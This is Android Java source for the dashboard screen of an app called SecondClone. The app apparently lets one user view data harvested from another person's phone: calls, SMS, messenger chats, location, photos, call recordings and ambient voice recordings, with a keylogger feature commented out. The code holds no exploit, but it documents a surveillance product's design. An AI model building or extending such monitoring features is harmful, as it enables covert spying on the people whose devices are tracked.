package com.jexpa.secondclone.View;

import android.content.Intent;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.GridLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import com.jexpa.secondclone.API.APIDatabase;
import com.jexpa.secondclone.Adapter.AdapterFeatureDashboard;
import com.jexpa.secondclone.Database.DatabaseDevice;
import com.jexpa.secondclone.Model.Feature;
import com.jexpa.secondclone.Model.Table;
import com.jexpa.secondclone.R;
import com.r0adkll.slidr.Slidr;

import java.util.ArrayList;
import java.util.List;

import static com.jexpa.secondclone.API.Global.GET_AMBIENT_VOICE_RECORDING;
import static com.jexpa.secondclone.API.Global.GET_APPLICATION_USAGE;
import static com.jexpa.secondclone.API.Global.GET_CALL_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_CONTACT_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_LOCATION_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_NOTES_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_PHONE_CALL_RECORDING;
import static com.jexpa.secondclone.API.Global.GET_PHOTO_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_SMS_HISTORY;
import static com.jexpa.secondclone.API.Global.GET_URL_HISTORY;

/**
 * Author: Lucaswalker@jexpa.com
 * Class: DashBoardRe
 * History: 7/30/2020
 * Project: SecondClone
 */
public class DashBoard extends AppCompatActivity {

    private RecyclerView rcl_Feature;
    private TextView txt_NamePhone,txt_PhoneStyle,txt_PhoneVersion,txt_Last_Sync;
    private Button btn_Sync_Settings;
    public Table table;
    private RecyclerView.Adapter mAdapter;
    private int packageID;
    ArrayList<Feature> featureList;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);
        Slidr.attach(this);
        String modelDevice = getIntent().getStringExtra("device");
        packageID = getIntent().getIntExtra("packageID",4);
        Log.i("zpackageID",packageID+"");
        /* database */
        DatabaseDevice databaseDevice = new DatabaseDevice(this);
        List<Table> tableList = databaseDevice.getAllDevice();
        for (Table t : tableList) {

            if (t.getID().equals(modelDevice)) {
                table = t;
                break;
            }
        }
        setID();
        setEvent();
    }

    private void setEvent()
    {
        rcl_Feature.setHasFixedSize(true);
        RecyclerView.LayoutManager mLayoutManager = new GridLayoutManager(this,3);
        rcl_Feature.setLayoutManager(mLayoutManager);
        featureList = new ArrayList<>();

        featureList.add(new Feature(R.drawable.call_icon,getApplicationContext().getResources().getString(R.string.CALL_HISTORY),GET_CALL_HISTORY));
        featureList.add(new Feature(R.drawable.messeage_app,getApplicationContext().getResources().getString(R.string.SMS_HISTORY),GET_SMS_HISTORY));
        featureList.add(new Feature(R.drawable.contact_icon,getApplicationContext().getResources().getString(R.string.CONTACT_HISTORY),GET_CONTACT_HISTORY));
        featureList.add(new Feature(R.drawable.url_browser,getApplicationContext().getResources().getString(R.string.URL_HISTORY),GET_URL_HISTORY));
        featureList.add(new Feature(R.drawable.gps_icon,getApplicationContext().getResources().getString(R.string.LOCATION_HISTORY), GET_LOCATION_HISTORY));
        featureList.add(new Feature(R.drawable.photo,getApplicationContext().getResources().getString(R.string.PHOTO_HISTORY),GET_PHOTO_HISTORY));
        featureList.add(new Feature(R.drawable.phone_call_icon,getApplicationContext().getResources().getString(R.string.PHONE_CALL_RECORDING),GET_PHONE_CALL_RECORDING));
        featureList.add(new Feature(R.drawable.voice_record_icon,getApplicationContext().getResources().getString(R.string.AMBIENT_VOICE_RECORDING),GET_AMBIENT_VOICE_RECORDING));
        featureList.add(new Feature(R.drawable.app_usage_icon,getApplicationContext().getResources().getString(R.string.APPLICATION_USAGE),GET_APPLICATION_USAGE));
        featureList.add(new Feature(R.drawable.note_icon,getApplicationContext().getResources().getString(R.string.NOTES_HISTORY),GET_NOTES_HISTORY));
        featureList.add(new Feature(R.drawable.whatsapp_icon,getApplicationContext().getResources().getString(R.string.WHATSAPP_HISTORY),GET_SMS_HISTORY));
        featureList.add(new Feature(R.drawable.viber_icon,getApplicationContext().getResources().getString(R.string.VIBER_HISTORY),GET_SMS_HISTORY));
        featureList.add(new Feature(R.drawable.messenger_small,getApplicationContext().getResources().getString(R.string.FACEBOOK_HISTORY),GET_SMS_HISTORY));
        featureList.add(new Feature(R.drawable.skype_icon,getApplicationContext().getResources().getString(R.string.SKYPE_HISTORY),GET_SMS_HISTORY));
        featureList.add(new Feature(R.drawable.hangoust,getApplicationContext().getResources().getString(R.string.HANGOUTS_HISTORY),GET_SMS_HISTORY));


        /* featureList.add(new Feature(R.drawable.instagram_icon,getApplicationContext().getResources().getString(R.string.INSTAGRAM_HISTORY),""));
        featureList.add(new Feature(R.drawable.keylogger_icon,getApplicationContext().getResources().getString(R.string.KEYLOGGER_HISTORY),""));
        featureList.add(new Feature(R.drawable.notification_icon,getApplicationContext().getResources().getString(R.string.NOTIFICATION_HISTORY),""));
        featureList.add(new Feature(R.drawable.alert_icons,getApplicationContext().getResources().getString(R.string.Alert_HISTORY),""));
        featureList.add(new Feature(R.drawable.app_install,getApplicationContext().getResources().getString(R.string.APP_INSTALL),""));
        featureList.add(new Feature(R.drawable.keyboard_icon,getApplicationContext().getResources().getString(R.string.CLIPBOARD_HISTORY),""));
        featureList.add(new Feature(R.drawable.calendar_icon,getApplicationContext().getResources().getString(R.string.CALENDAR_HISTORY),""));
        featureList.add(new Feature(R.drawable.wifi_status,getApplicationContext().getResources().getString(R.string.WIFI_HISTORY),""));*/

        APIDatabase.getTimeLastSync(txt_Last_Sync, DashBoard.this, table.getLast_Online());
        // adapter
        mAdapter = new AdapterFeatureDashboard(featureList, DashBoard.this, table);
        rcl_Feature.setAdapter(mAdapter);

        btn_Sync_Settings.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Intent intent = new Intent(getApplicationContext(), SyncSettings.class);
                //  intent sends the device object to the class Dashboard
                intent.putExtra("device", table.getID());
                intent.putExtra("packageID",ManagementDevice.packageID);
                startActivity(intent);
            }
        });
    }

    private void setID()
    {
        rcl_Feature = findViewById(R.id.rcl_Dashboard);
        btn_Sync_Settings = findViewById(R.id.btn_Sync_Settings);
        txt_NamePhone = findViewById(R.id.txt_NamePhone);
        txt_PhoneStyle = findViewById(R.id.txt_PhoneStyle);
        txt_PhoneVersion = findViewById(R.id.txt_PhoneVersion);
        txt_Last_Sync = findViewById(R.id.txt_Last_Sync);
        txt_NamePhone.setText(table.getDevice_Name());
        txt_PhoneStyle.setText(table.getOS_Device());
        txt_PhoneVersion.setText(table.getApp_Version_Number());
    }


    @Override
    protected void onResume() {
        super.onResume();
        mAdapter = new AdapterFeatureDashboard(featureList, DashBoard.this, table);
        rcl_Feature.setAdapter(mAdapter);
    }
}
